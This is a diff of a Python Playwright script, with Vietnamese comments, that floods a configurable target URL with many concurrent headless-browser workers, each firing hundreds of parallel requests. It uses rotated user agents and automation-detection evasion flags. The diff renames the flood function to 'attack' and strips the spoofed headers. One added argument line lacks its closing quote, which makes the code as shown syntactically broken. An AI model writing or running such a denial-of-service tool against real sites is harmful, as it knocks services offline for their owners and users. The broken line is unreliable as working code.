@@ -5,9 +5,9 @@ import os
 from playwright.async_api import async_playwright
 
 TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
-DURATION = int(os.getenv("DURATION", "20"))
-CONCURRENCY = int(os.getenv("CONCURRENCY", "130"))
-REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "5000"))
+DURATION = int(os.getenv("DURATION", "20"))   # giây
+CONCURRENCY = int(os.getenv("CONCURRENCY", "130"))  # số tab song song
+REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "500"))  # số request song song mỗi vòng/tab
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0 Safari/537.36",
@@ -20,7 +20,7 @@ success = 0
 fail = 0
 status_count = {}
 
-async def flood(playwright, worker_id):
+async def attack(playwright, worker_id):
     global success, fail, status_count
 
     ua = random.choice(USER_AGENTS)
@@ -33,6 +33,7 @@ async def flood(playwright, worker_id):
             "--disable-features=IsolateOrigins,site-per-process",
             "--disable-blink-features=AutomationControlled",
             "--no-sandbox",
+            "--disable-dev-shm-usage
             "--disable-dev-shm-usage",
             "--disable-setuid-sandbox",
             "--disable-software-rasterizer",
@@ -51,39 +52,19 @@ async def flood(playwright, worker_id):
             "--disable-ipc-flooding-protection",
             "--enable-automation",
             "--password-store=basic",
-            "--use-mock-keychain",
-            "--single-process"
+            "--use-mock-keychain",        
         ]
     )
     context = await browser.new_context(
         user_agent=ua,
-        extra_http_headers={
-            "Accept-Language": lang,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-            "Cache-Control": "max-age=0"
-        },
-        ignore_https_errors=True,
-        java_script_enabled=False
+        extra_http_headers={"Accept-Language": lang}
     )
 
     start = time.time()
     while time.time() - start < DURATION:
         tasks = []
         for _ in range(REQ_PER_LOOP):
-            tasks.append(context.request.get(
-                TARGET_URL, 
-                timeout=10000,
-                headers={
-                    "Referer": "https://www.google.com/",
-                    "DNT": "1",
-                    "Sec-Fetch-Dest": "document",
-                    "Sec-Fetch-Mode": "navigate",
-                    "Sec-Fetch-Site": "cross-site"
-                }
-            ))
+            tasks.append(context.request.get(TARGET_URL, timeout=10000))
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
         for res in results:
@@ -100,9 +81,9 @@ async def flood(playwright, worker_id):
 
     await browser.close()
 
-async def execute():
+async def main():
     async with async_playwright() as p:
-        tasks = [flood(p, i) for i in range(CONCURRENCY)]
+        tasks = [attack(p, i) for i in range(CONCURRENCY)]
         await asyncio.gather(*tasks)
 
     total = success + fail
@@ -114,4 +95,4 @@ async def execute():
     print("Status breakdown:", status_count)
 
 if __name__ == "__main__":
-    asyncio.run(execute())
+    asyncio.run(main()) 
